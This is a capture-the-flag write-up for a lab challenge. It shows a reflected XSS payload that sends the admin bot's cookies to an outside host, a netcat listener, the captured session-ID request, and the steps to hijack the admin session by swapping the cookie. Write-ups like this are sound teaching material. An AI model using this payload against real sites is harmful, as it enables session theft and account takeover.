# CTF101: Challenge 6

## Type of attack 

- Reflected XSS
- Session hijacking

## Flag

*Forgot to save the flag...*

---

## Inject XSS on wall

```html
<script>window.location = 'http://nc.irvinlim.com/' + encodeURIComponent(document.cookie);</script>
```

Ideally it should be an AJAX call that wouldn't be noticed, but for this demo we can just use `window.location` since there is an admin bot that will evaluate JavaScript, whose session we are trying to steal.

## Set up listening server

In the example above, I set up a `netcat` server which listens on port `3123`, and reversed proxied `nc.irvinlim.com:80` to `127.0.0.1:3123` on the server.

## Listen for requests from admin

Set up the server:

```shell
nc -l 3123
```

Click the button on the wall page to request admin to visit the wall which contains the reflected XSS. You should see the request come in like this:

```http
GET /PHPSESSID%3Dvuggr3e7udoamuadm5lnadnf24 HTTP/1.1
Connection: upgrade
Referer: http://128.199.224.160:3005/wall.php?uid=1i7qsEaqV3AMvnRN1adK
Host: nc.irvinlim.com
X-Real-IP: 172.68.253.139
X-Forwarded-Host: nc.irvinlim.com
X-Forwarded-Server: nc.irvinlim.com
X-Forwarded-For: 128.199.224.160, 172.68.253.139
CF-IPCountry: SG
CF-RAY: 39b86b91e5e5194a-HKG
X-Forwarded-Proto: http
CF-Visitor: {"scheme":"http"}
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) PhantomJS/1.9.0 Safari/534.34
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en,*
CF-Connecting-IP: 128.199.224.160
```

## Hijack the session

Using the EditThisCookie Chrome extension or otherwise, change the `PHPSESSID` cookie value to the session ID that we retrieved from XSS.

Log in and the flag should be visible.
